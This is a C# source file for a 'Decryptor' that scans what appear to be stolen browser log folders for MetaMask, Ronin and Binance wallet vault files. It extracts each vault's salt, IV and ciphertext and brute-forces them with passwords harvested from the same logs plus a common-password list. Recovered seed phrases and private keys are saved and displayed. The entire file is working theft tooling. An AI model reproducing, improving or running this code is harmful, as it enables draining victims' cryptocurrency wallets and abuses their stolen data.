using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Spectre.Console;
using System.Collections.Concurrent;
using System.Text;
using System.Text.RegularExpressions;
using static Utils;

public class Decryptor
{
    public static Structures.Types GetVaultType(string path)
    {
        var Settings = new Utils.IniFile("Settings.ini");
        string? rootPath = Settings.Read("Main", "LastPath");
        string? pathName = Path.GetDirectoryName(path);

        if (pathName is not null && pathName != rootPath)
        {
            string? subPath = Path.GetDirectoryName(path);

            Structures.Types type = pathName.ToLower() switch
            {
                string s when s.Contains("binance") => Structures.Types.Binance,
                string s when s.Contains("ronin") => Structures.Types.Ronin,
                string s when s.Contains("metamask") => Structures.Types.Metamask,
                _ => subPath is null ? Structures.Types.Unknown : GetVaultType(subPath),
            };

            return type;
        }

        else
        {
            return Structures.Types.Unknown;
        }
    }

    public static List<Structures.Vault.Encrypted>? GrabVaults(string path)
    {
        try
        {
            List<Structures.Vault.Encrypted> encryptedVaults = new();
            Structures.Types type = GetVaultType(path);
            if (!Parsers.SupportedWallets.ContainsKey(type)) return encryptedVaults;
            string data = File.ReadAllText(path, Encoding.UTF8);
            Structures.Vault.Regex VaultRegex = Parsers.SupportedWallets[type].VaultRegex();

            var matches = Regex.Matches(data, VaultRegex.Vault).ToList();
            if (matches.Count < 1) throw new Exception("No data Matches found");

            foreach (Match match in matches)
            {
                string vault_string = match.Value.Replace("\\", "");
                Structures.Vault.Encrypted encryptedVault = new()
                {
                    Path = path,
                    Type = type,
                    Data = Regex.Match(vault_string, VaultRegex.Data).Groups[1].Value,
                    IV = Regex.Match(vault_string, VaultRegex.IV).Groups[1].Value,
                    Salt = Regex.Match(vault_string, VaultRegex.Salt).Groups[1].Value
                };

                if (encryptedVault.Data?.Length < 10 ||
                    encryptedVault.Salt?.Length < 10 ||
                    encryptedVault.IV?.Length < 10 ||
                    encryptedVault.Path?.Length < 6) continue;
                else
                {
                    encryptedVaults.Add(encryptedVault);
                };
            }

            return encryptedVaults.GroupBy(element => new { element.Data, element.IV, element.Salt })
                                  .Select(element => element.First())
                                  .ToList();
        }

        catch (Exception)
        {
            return null;
        }
    }

    public static string? DecryptVault(string password, string salt, string iv, string data)
    {
        string? decryptedData;
        try
        {
            byte[] saltBytes = Convert.FromBase64String(salt),
                   ivBytes = Convert.FromBase64String(iv),
                   dataBytes = Convert.FromBase64String(data);

            Pkcs5S2ParametersGenerator pbkdf2 = new(new Sha256Digest());
            pbkdf2.Init(Encoding.UTF8.GetBytes(password), saltBytes, 10000);
            KeyParameter keyParam = (KeyParameter)pbkdf2.GenerateDerivedMacParameters(256);

            GcmBlockCipher aes = new(new AesEngine());
            AeadParameters parameters = new(new KeyParameter(keyParam.GetKey()), 128, ivBytes, null);
            aes.Init(false, parameters);

            byte[] decryptedBytes = new byte[aes.GetOutputSize(dataBytes.Length)];
            int decryptedLength = aes.ProcessBytes(dataBytes, 0, dataBytes.Length, decryptedBytes, 0);
            aes.DoFinal(decryptedBytes, decryptedLength);

            decryptedData = Encoding.UTF8.GetString(decryptedBytes);

            if (decryptedData.Length < 10) return null;
        }

        catch (Exception)
        {
            return null;
        }

        return decryptedData;
    }

    public static Structures.Vault.Secret? Decrypt(string path, List<string> passwords)
    {
        var Settings = new Utils.IniFile("Settings.ini");
        string? RootPath = Settings.Read("Main", "LastPath");
        var EncryptedVaults = GrabVaults(path);
        if (EncryptedVaults is null) return null;
        string? CachedPassword = null;
        string? CachedType = null;

        var Secret = new Structures.Vault.Secret
        {
            Mnemonics = new(),
            PrivateKeys = new()
        };

        foreach (var EncryptedVault in EncryptedVaults)
        {
            foreach (var pwd in passwords)
            {
                string Password = pwd;
                CachedType = EncryptedVault.Type.ToString();
                if (CachedPassword is not null) Password = CachedPassword;

                var DecryptedString = DecryptVault(Password, EncryptedVault.Salt, EncryptedVault.IV, EncryptedVault.Data);

                if (DecryptedString is null)
                {
                    if (Password == passwords[^1])
                    {
                        Secret.Password = null;
                        Secret.Decrypted = false;
                    }

                    if (Password == CachedPassword)
                    {
                        CachedPassword = null;
                        Password = pwd;
                        DecryptedString = DecryptVault(Password, EncryptedVault.Salt, EncryptedVault.IV, EncryptedVault.Data);

                        if (DecryptedString is null) continue;
                    }
                }

                else
                {
                    Secret.Password = Password;
                    Secret.Type = EncryptedVault.Type;
                    Secret.Decrypted = true;

                    var DecryptedSecret = Parsers.Parse(EncryptedVault.Type, DecryptedString);
                    var UniqueSecret = new Structures.Vault.Secret()
                    {
                        Mnemonics = new(),
                        PrivateKeys = new()
                    };

                    if (DecryptedSecret.Mnemonics.Count > 0)
                    {
                        UniqueSecret.Mnemonics = DecryptedSecret.Mnemonics.Select(el => { el.Path = EncryptedVault.Path is null ? "Unknown" : EncryptedVault.Path; return el; })
                            .ToList()
                            .Where(el => !Secret.Mnemonics.Contains(el))
                            .ToList();

                        UniqueSecret.Mnemonics.ForEach(el => { if (!Secret.Mnemonics.Contains(el)) Secret.Mnemonics.Add(el); });
                    }

                    if (DecryptedSecret.PrivateKeys.Count > 0)
                    {
                        UniqueSecret.PrivateKeys = DecryptedSecret.PrivateKeys.Select(el => { el.Path = EncryptedVault.Path is null ? "Unknown" : EncryptedVault.Path; return el; })
                            .ToList()
                            .Where(el => !Secret.PrivateKeys.Contains(el))
                            .ToList();

                        UniqueSecret.PrivateKeys.ForEach(el => { if (!Secret.PrivateKeys.Contains(el)) Secret.PrivateKeys.Add(el); });
                    }

                    CachedPassword = Password;
                    break;
                }
            }
        }

        return Secret;
    }

    public static List<string>? FindVaultFiles(string path)
    {
        List<string> CryptoFiles = new();

        var Files = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories)
            .Where(s => s.EndsWith(".ldb") || s.EndsWith(".log"))
            .ToList();
        if (Files.Count < 1) return null;

        Files.ForEach(el => CryptoFiles.Add(el));
        return CryptoFiles;
    }

    public static List<Structures.Vault.Secret> Call(string LogsPath, string RecordPath)
    {
        AnsiConsole.MarkupLine(" [mediumpurple]#[/] Decryptor started");
        var Secrets = new List<Structures.Vault.Secret>();
        var SecretsPrivateKeys = new List<Structures.PrivateKey>();
        var SecretsMnemonics = new List<Structures.Mnemonic>();

        var Settings = new IniFile("Settings.ini");
        string? Threads = Settings.Read("Decryptor", "Threads");
        bool SimplifiedView = Settings.Read("Output", "SimplifiedView") == "True";
        List<string> CommonPasswords = GetCommonPasswords();

        var LinesSpinner = new CustomSpinners.Lines();

        if (Threads is null || Threads == "")
        {
            var Defaults = GetDefaults();
            var DefaultThreads = Defaults.First(el => el.Section == "Decryptor" && el.Section == "Threads");
            AnsiConsole.MarkupLine($" [plum2]![/] Since the threads has not been configured the default value is [plum2]{{{DefaultThreads.Value} threads}}[/]");
            Threads = DefaultThreads.Value;
        }

        AnsiConsole.Status()
            .Spinner(LinesSpinner)
            .SpinnerStyle(Style.Parse("mediumpurple"))
            .Start(" [mediumpurple]@[/] Collecting crypto-files...", ctx =>
            {
                var CryptoFiles = FindVaultFiles(LogsPath);

                if (CryptoFiles is not null)
                {
                    AnsiConsole.MarkupLine($" [mediumpurple]>[/] Found [mediumpurple]{{{CryptoFiles.Count} files}}[/]");
                    ctx.Status = " [mediumpurple]@[/] Working...";

                    int SecretIndex = 0;
                    int CryptoFilesCount = CryptoFiles.Count;
                    var Partitions = Partitioner.Create(CryptoFiles).GetPartitions(int.Parse(Threads));
                    var Tasks = new List<Task>();

                    foreach (var Partition in Partitions)
                    {
                        var task = Task.Run(() =>
                        {
                            while (Partition.MoveNext())
                            {
                                try
                                {
                                    var File = Partition.Current;
                                    var Passwords = FindPasswords(LogsPath, Path.GetDirectoryName(File));
                                    var FoundPasswordsCount = Passwords?.Count;
                                    Passwords ??= CommonPasswords;
                                    var Secret = Decrypt(File, Passwords);
                                    SecretIndex++;

                                    var table = new Table();
                                    var StatusColumnHeader = new Panel("[mediumpurple]Status message[/]").Expand();
                                    var FileRow = new Markup($" [mediumpurple]>[/] File [mediumpurple]{Path.GetFileName(File)}[/]  ");
                                    Markup? StatusColumnData;
                                    TableColumn? StatusColumn;
                                    table.Border(TableBorder.None);

                                    if (Secret?.Decrypted is false)
                                    {
                                        Passwords = CommonPasswords;
                                        Secret = Decrypt(File, Passwords);
                                    }

                                    if (Secret is not null)
                                    {
                                        if (Secret.Value.Decrypted is true)
                                        {
                                            StatusColumnData = new Markup($"Wallet [mediumpurple]{{{Secret.Value.Type}}}[/] was decrypted [mediumpurple]{{at {DateTime.Now:HH:mm:ss}}}[/] with password [mediumpurple]{{{Secret.Value.Password}}}[/]");
                                            StatusColumn = new TableColumn(new Rows(StatusColumnHeader, StatusColumnData));
                                            StatusColumn.Width = 25;
                                            table.AddColumn(StatusColumn);

                                            if ((Secret.Value.Mnemonics.Count != 0 || Secret.Value.PrivateKeys.Count != 0) && !Secrets.Contains(Secret.Value))
                                            {
                                                Secrets.Add(Secret.Value);
                                                string RecordFullPath = $"{RecordPath}/Decryptor";
                                                Recorders.Universal.Record(RecordFullPath, Secret.Value);

                                                if (Secret.Value.Mnemonics.Count > 0)
                                                {
                                                    var MnemonicColumnRows = new Rows(new Panel("[mediumpurple]Mnemonics[/]").Expand(), new Rows(Secret.Value.Mnemonics.Select((mnemonic, i) => new Markup($"[mediumpurple]{i + 1}.[/] {mnemonic.Value}")).ToList()));
                                                    var MnemonicColumn = new TableColumn(new Rows(MnemonicColumnRows));
                                                    Secret.Value.Mnemonics.ForEach(mnemonic => { if (!SecretsMnemonics.Contains(mnemonic)) SecretsMnemonics.Add(mnemonic); });

                                                    if (Secret.Value.PrivateKeys.Count < 1) MnemonicColumn.Width = 61; 
                                                    else MnemonicColumn.Width = 30;
                                                    table.AddColumn(MnemonicColumn);
                                                };

                                                if (Secret.Value.PrivateKeys.Count > 0)
                                                {
                                                    var KeysColumnRows = new Rows(new Panel("[mediumpurple]Keys[/]").Expand(), new Rows(Secret.Value.PrivateKeys.Select((key, i) => new Markup($"[mediumpurple]{i + 1}. {(key.Data is null ? "Default" : "Account")}[/]\n{key.Value}")).ToList()));
                                                    var KeysColumn = new TableColumn(KeysColumnRows);
                                                    Secret.Value.PrivateKeys.ForEach(key => { if (!SecretsPrivateKeys.Contains(key)) SecretsPrivateKeys.Add(key); });

                                                    if (Secret.Value.Mnemonics.Count < 1) KeysColumn.Width = 61;
                                                    else KeysColumn.Width = 30;
                                                    table.AddColumn(KeysColumn);
                                                }
                                            }

                                            else
                                            {
                                                FileRow = new Markup($" [plum2]>[/] File [plum2]{Path.GetFileName(File)}[/]  ");
                                                var EmptyDataRows = new Rows(new Panel("[plum2]Empty data[/]").Expand(), new Markup($"{(Secret.Value.Type is Structures.Types.Unknown ? "Because of an unsupported wallet type, a regular expression was used to search for data and did not find any mnemonics or private keys" : "The object does not contains amy mnemonics or private keys")}"));
                                                var EmptyDataColumn = new TableColumn(EmptyDataRows);
                                                EmptyDataColumn.Width = 61;
                                                table.AddColumn(EmptyDataColumn);
                                            }
                                        }

                                        else
                                        {
                                            FileRow = new Markup($" [plum2]>[/] File [plum2]{Path.GetFileName(File)}[/]  ");
                                            StatusColumnHeader = new Panel("[plum2]Status message[/]").Expand();
                                            StatusColumnData = new Markup($"Wallet [plum2]{{{Secret.Value.Type}}}[/] wasn't decrypted [plum2]{{at {DateTime.Now:HH:mm:ss}}}[/] with found [plum2]{{{(FoundPasswordsCount is null ? 0 : FoundPasswordsCount.Value)}}}[/] passwords and common [plum2]{{{CommonPasswords.Count}}}[/] passwords");
                                            StatusColumn = new TableColumn(new Rows(StatusColumnHeader, StatusColumnData));
                                            StatusColumn.Width = 87;
                                            table.AddColumn(StatusColumn);
                                        }

                                        var FormattedColumns = new Columns(new Text("  "), new Columns(table));
                                        FormattedColumns.Expand = false;
                                        var OutputColums = new Rows(new Text("           "), FileRow, FormattedColumns);
                                        OutputColums.Expand = false;
                                        AnsiConsole.Write(OutputColums);
                                    }
                                }
                                catch (Exception e) 
                                { 
                                    Console.WriteLine(e);
                                }
                            }
                        });
                        Tasks.Add(task);
                    }

                    Task.WaitAll(Tasks.ToArray());
                    AnsiConsole.MarkupLine("\n [mediumpurple]#[/] Decrypting is done\n");

                    if (Secrets.Count > 0)
                    {
                        var BChart = new BarChart();
                        BChart.Width = 60;
                        var SecretsData = new Dictionary<string, int>();

                        if (SecretsPrivateKeys.Count > 0) SecretsData.Add("Keys", SecretsPrivateKeys.Count);
                        if (SecretsMnemonics.Count > 0) SecretsData.Add("Mnemonics", SecretsMnemonics.Count);

                        var OrderedSecretsData = SecretsData.OrderByDescending(el => el.Value);
                        var SDColors = new Dictionary<int, Color>()
                        {
                            { 1, Color.Plum1 },
                            { 2, Color.Plum2 }
                        };

                        var CurrentDataIndex = 1;
                        foreach (var OSD in OrderedSecretsData)
                        {
                            BChart.AddItem($" {OSD.Key}", OSD.Value, SDColors[CurrentDataIndex]);
                            CurrentDataIndex++;
                        }

                        AnsiConsole.Write(BChart);
                    }
                    else AnsiConsole.MarkupLine(" [black on plum2] No any secrets was decrypted [/]");
                }

                else
                {
                    AnsiConsole.MarkupLine("\n [black on plum2] No any cryptofiles was found [/]");
                }
            });

        return Secrets;
    }
}